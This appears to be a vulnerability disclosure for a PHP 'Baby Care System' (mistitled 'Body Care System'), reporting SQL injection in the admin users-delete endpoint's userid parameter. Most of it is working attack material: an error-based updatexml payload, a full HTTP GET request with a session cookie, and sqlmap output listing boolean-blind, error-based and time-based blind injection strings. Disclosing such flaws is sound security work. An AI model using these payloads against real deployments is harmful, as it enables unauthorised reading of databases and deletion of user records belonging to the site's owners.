## Body Care System has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html

Vulnerability file: /BabyCare/admin/uesrs.php&&action=delete&userid=4

![image](https://user-images.githubusercontent.com/54017627/161356819-85b2956c-6f77-40f2-8f48-4a4e32ab0963.png)

Vulnerability location: /BabyCare/admin.php?id=users&action=delete&userid=4 //uesrid is Injection point

[+]Payload: /BabyCare/admin.php?id=users&action=delete&userid=4%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+  //userid is Injection point

```sql
GET /BabyCare/admin.php?id=users&action=delete&userid=4%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ HTTP/1.1
Host: 192.168.1.19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=h48mjnelp4g0935821l2k3g5ne
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/161356722-7853064b-163d-40d1-b66c-6547ce119001.png)

```sql
---
Parameter: userid (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=users&action=delete&userid=4' RLIKE (SELECT (CASE WHEN (9720=9720) THEN 4 ELSE 0x28 END))-- nviO

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=users&action=delete&userid=4' AND EXTRACTVALUE(9289,CONCAT(0x5c,0x716b6b6271,(SELECT (ELT(9289=9289,1))),0x717a707a71))-- ULrQ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=users&action=delete&userid=4' AND (SELECT 6930 FROM (SELECT(SLEEP(5)))eKMb)-- Pdwh
---
```

![image](https://user-images.githubusercontent.com/54017627/161356843-59a6dd0a-d394-4f8f-bedf-0fe88ca618c6.png)

